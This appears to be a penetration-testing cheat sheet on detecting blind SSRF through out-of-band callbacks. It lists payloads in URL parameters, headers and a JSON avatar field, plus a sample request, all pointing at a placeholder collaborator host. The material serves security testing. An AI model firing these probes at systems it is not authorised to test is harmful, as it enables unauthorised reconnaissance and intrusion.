# Blind SSRF

## Summary
Detect and exploit blind SSRF via OOB channels when no response data is visible.

## Detection Vectors

### URL Parameters
```bash
# Test every URL/user-supplied host parameter
url=http://COLLABORATOR/probe
image_url=http://COLLABORATOR/probe
avatarUrl=http://COLLABORATOR/probe
webhook=http://COLLABORATOR/probe
callback=http://COLLABORATOR/probe
redirect=http://COLLABORATOR/probe
```

### Headers
```bash
# SSRF via headers that trigger server-side requests
X-Forwarded-Host: COLLABORATOR
Referer: http://COLLABORATOR/
```

### File Upload / Image URLs
```bash
# If app fetches images from user-provided URLs
POST /api/profile
{"avatarUrl": "http://COLLABORATOR/test"}

# If app processes uploaded files that reference external URLs
# Try SVG with external entity
```

## Technique
Use an interaction tracker (webhook.site, Burp Collaborator, interact.sh):
```
POST /api/proxy HTTP/1.1
Host: app.com
url=http://COLLABORATOR/probe

→ If COLLABORATOR receives request → SSRF confirmed
```

## Differentiating Blind SSRF from DNS Lookups
- Add a unique path per endpoint tested
- Check COLLABORATOR for:
  - HTTP request (full SSRF)
  - DNS lookup only (partial/restricted SSRF)

## Confirmation Payloads
```bash
# HTTP
url=http://COLLABORATOR/ssrf-test-1

# HTTPS (if HTTP is blocked)
url=https://COLLABORATOR/ssrf-test-2

# DNS only (if protocol restricted)
url=http://nonexistent.COLLABORATOR/
```
